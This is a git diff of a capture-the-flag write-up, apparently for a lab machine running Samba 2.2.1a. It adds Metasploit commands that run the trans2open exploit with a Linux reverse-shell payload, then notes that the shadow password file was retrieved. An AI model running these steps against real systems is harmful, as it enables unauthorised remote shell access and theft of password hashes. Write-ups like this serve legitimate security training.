@@ -74,34 +74,22 @@ Searched for Samba 2.2.1a exploit on metasploit:
 
 ![Metasploit](./img/metasploit.png)
 
+Loaded the exploit through metasploit:
 
-Explain how you approached exploiting the challenge:
-- Vulnerabilities or weaknesses identified
-- Tools used (exploit frameworks, custom scripts, etc.)
-- Step-by-step breakdown of the exploitation process
-- Screenshots, code snippets, or command outputs to illustrate each step
+msf6 exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp
+payload => linux/x86/shell_reverse_tcp
+msf6 exploit(linux/samba/trans2open) > exploit
 
-## Privilege Escalation
-If applicable, describe how you escalated privileges:
-- Any misconfigurations or vulnerabilities identified
-- Exploits or techniques used for privilege escalation
-- Detailed explanation of how you gained higher-level access
+![Metasploit](./img/post.png)
 
 ## Flag Retrieval
-Detail how you located and captured the flag(s):
-- Method used to identify the flag location
-- Exact flag(s) content and format
-- Proof of flag retrieval (screenshot or flag content)
+Retrieved the shadow file:
 
-## Conclusion
-Summarize your experience and takeaways from the challenge:
-- Lessons learned during the CTF
-- New skills or knowledge gained
-- Challenges faced and how you overcame them
-- Shoutouts or acknowledgments to teammates or resources
+![Metasploit](./img/metasploit.png)
+
 
 ## Resources
 List any external sources, tools, or references you used:
-- Official documentation
-- Write-ups from other participants (if referred)
-- Tools or frameworks used
+- https://nmap.org/
+- https://www.metasploit.com/
+- https://www.metasploit.com/
